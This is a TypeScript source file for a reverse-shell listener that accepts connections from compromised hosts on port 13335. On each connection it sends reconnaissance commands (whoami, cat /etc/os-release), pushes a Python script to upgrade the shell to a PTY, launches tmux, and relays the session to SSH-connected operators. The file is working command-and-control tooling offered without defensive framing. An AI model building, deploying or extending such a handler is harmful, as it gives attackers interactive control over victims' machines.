import './ssh';
import './tunnel';

import * as net from 'net';
import fs from 'fs';
import path from 'path';
import { activeConnections, activeSSHConnections, ConnectionInfo } from './state';

const PORT = 13335;

const reverseShellServer = net.createServer();
const script = fs.readFileSync(path.join(__dirname, 'client.py'), 'utf-8');

reverseShellServer.on('connection', (socket) => {
    const connectionId = `${socket.remoteAddress}:${socket.remotePort}`;
    console.log(`[+] New reverse shell connection from ${connectionId}`);
    const info = new ConnectionInfo(socket, '', '');
    activeConnections.set(connectionId, info);

    // 发送创建PTY的命令，设置初始终端大小
    const ptyCommand = `python3 -c "${script.replace(/\\/g, '\\').replace(/"/g, '\\"')}" ; echo SHELL_EXITED`;
    info.socket.write('echo ---START_INFO$[1+1]---\necho WHOAMI=$(whoami)\ncat /etc/os-release\necho ---END_INFO$[1+1]---\n');
    info.socket.write(ptyCommand);
    info.socket.write('\nclear\n');

    let isInfo = false;
    let buffer = '';

    const interval = setInterval(() => {
        try {
            info.resize(info.rows, info.cols);
        } catch (e) { }
    }, 30000);

    const infoCallback = (data) => {
        const str = data.toString();
        if (str.includes('---END_INFO2---') && isInfo) {
            buffer += str.split('---END_INFO2---')[0];
            const lines = buffer.split(/[\r\n]/);
            for (const line of lines) {
                if (line.startsWith('PRETTY_NAME=')) {
                    info.os = line.slice('PRETTY_NAME='.length).replace(/"/g, '').trim();
                } else if (line.startsWith('WHOAMI=')) {
                    info.user = line.slice('WHOAMI='.length).trim();
                }
            }
            info.socket.off('data', infoCallback);
            activeSSHConnections.forEach((sshState, cl) => {
                sshState.drawBottomBar();
            });
            // Try to start tmux after a short delay to let the PTY settle
            setTimeout(() => {
                info.socket.write(
                    'if which tmux > /dev/null 2>&1; then' +
                    ' printf "\\x1b[9198t";' +
                    ' tmux new-session -d -s omc 2>/dev/null;' +
                    ' tmux set -g mouse on;' +
                    ' tmux attach -t omc;' +
                    ' else printf "\\x1b[9197t"; fi\n',
                );
            }, 300);
        }
        if (str.includes('---START_INFO2---')) {
            buffer += str.split('---START_INFO2---')[1];
            isInfo = true;
        } else if (isInfo) {
            buffer += str;
        }
    }
    info.socket.on('data', infoCallback);

    info.socket.on('data', (rawData) => {
        // Strip and parse tmux status markers before any forwarding
        let data = rawData;
        const rawStr = rawData.toString('binary');
        if (rawStr.includes('\x1b[9198t') || rawStr.includes('\x1b[9197t')) {
            if (rawStr.includes('\x1b[9198t')) {
                info.tmuxEnabled = true;
                info.tmuxCurrentWindow = 1;
                info.tmuxWindowCount = 1;
                activeSSHConnections.forEach(s => s.drawBottomBar());
            }
            const cleaned = rawStr.split('\x1b[9198t').join('').split('\x1b[9197t').join('');
            data = Buffer.from(cleaned, 'binary');
            if (!data.length) return;
        }

        const str = data.toString();
        if (str.includes('SHELL_EXITED')) {
            activeSSHConnections.forEach((sshConn, client) => {
                if (sshConn.selectedId === connectionId) client.end();
            });
            info.socket.write(ptyCommand);
            return;
        }
        info.terminal.write(data);
        // write hex dump
        console.log(`[${connectionId}] ${data.toString('hex')}`);
        activeSSHConnections.forEach((sshConn) => {
            if (sshConn.selectedId === connectionId && sshConn.stream) {
                sshConn.stream.write(data);
                if (str.includes('\x1b[2J')) {
                    sshConn.drawBottomBar();
                }
            }
        });
    });

    info.socket.on('close', () => {
        console.log(`[-] Reverse shell connection closed from ${connectionId}`);
        activeConnections.delete(connectionId);
        activeSSHConnections.forEach((sshState, client) => {
            if (sshState.selectedId === connectionId) {
                sshState.selectedId = null;
                sshState.commandMode = true;
                sshState.tmuxInterceptMode = false;
                sshState.stream?.write('\r\nReverse shell connection closed.\r\nEntering command mode.\r\n');
                sshState.drawBottomBar();
            }
        });
        clearInterval(interval);
    });

    info.socket.on('error', (err) => {
        console.error(`[!] Socket error: ${err.message}`);
        activeConnections.delete(connectionId);
        clearInterval(interval);
    });
});

reverseShellServer.listen(PORT, () => {
    console.log(`[*] Reverse shell server listening on port ${PORT}`);
    console.log('[*] Waiting for reverse shell connections...');
});

// 生成SSH密钥对（如果不存在）
